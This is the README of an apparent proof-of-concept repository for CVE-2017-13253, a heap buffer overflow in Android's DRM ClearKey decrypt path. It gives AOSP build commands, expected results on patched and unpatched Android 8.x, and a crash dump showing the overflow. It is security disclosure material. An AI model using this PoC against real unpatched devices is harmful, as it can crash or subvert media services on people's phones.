# CVE-2017-13253

PoC code for CVE-2017-13253.

The full write-up is available [here](https://blog.zimperium.com/cve-2017-13253-buffer-overflow-multiple-android-drm-services). Note that the numbers are a little bit different from the blog post, as I've found that there's a higher chance for a crash with a heap of 0x2000 (of course if you run it enough times it should crash anyway).

For questions/issues/comments you're welcome to contact me on Twitter ([@tamir_zb](https://twitter.com/tamir_zb)).

## Build

In order to build this:

1. [Download the Android source code](https://source.android.com/setup/downloading).
2. Put this repository in `AOSP/external`.
3. Run the following commands:

```
    cd AOSP
    source build/envsetup.sh
    make icrypto_overflow
```

## Result

Running this against an unpatched version of Android (8.0-8.1 before March 2018) should result in an overflow. This might result in a crash, depending on whether the overwritten data is writable or not.

The code should print the output of the `decrypt` method, which may vary:

* In case it is being ran against a patched version of Android (March 2018 or later) then `decrypt` should return `BAD_VALUE` (-22).
* In case no crash happens (the overwritten data is writable) then `decrypt` should return the amount of data it copied.
* In case the vendor implements the HAL as a seperate process (e.g.  Pixel 2) then `decrypt` should return `UNKNOWN_ERROR` (-32).
* In case the vendor implements the HAL in the same process (e.g.  Nexus 5X) then `decrypt` should return 0.

Here's a partial crash dump resulted from running this PoC:

```
Build fingerprint: 'google/walleye/walleye:8.1.0/OPM1.171019.011/4448085:user/release-keys'
Revision: 'MP1'
ABI: 'arm'
pid: 761, tid: 5232, name: HwBinder:761_1  >>> /vendor/bin/hw/android.hardware.drm@1.0-service <<<
signal 11 (SIGSEGV), code 2 (SEGV_ACCERR), fault addr 0xee20f000
    r0 ee20f000  r1 ee20d021  r2 00001eff  r3 00000001
    r4 00000001  r5 00000000  r6 ed117008  r7 00000000
    r8 00000000  r9 fffff82a  sl ee20d000  fp ee20efff
    ip 08000000  sp ed2893c8  lr ed369e6b  pc edda7f0c  cpsr 20070010

backtrace:
    #00 pc 00018f0c  /system/lib/libc.so (__memcpy_base+244)
    #01 pc 00004e67  /vendor/lib/mediadrm/libdrmclearkeyplugin.so (clearkeydrm::CryptoPlugin::decrypt(bool, unsigned char const*, unsigned char const*, android::CryptoPlugin::Mode, android::CryptoPlugin::Pattern const&, void const*, android::CryptoPlugin::SubSample const*, unsigned int, void*, android::AString*)+82)
    ...

memory map (205 entries):
(fault address prefixed with --->)
    ...
    ee20d000-ee20efff rw-         0      2000  /dev/ashmem/MemoryHeapBase (deleted)
--->ee20f000-ee20ffff ---         0      1000  [anon:thread signal stack guard page]
    ...
```

As you can see, the fault address is the memory just after the shared memory. Since this memory is write-protected, the overflow resulted in a segmentation fault.
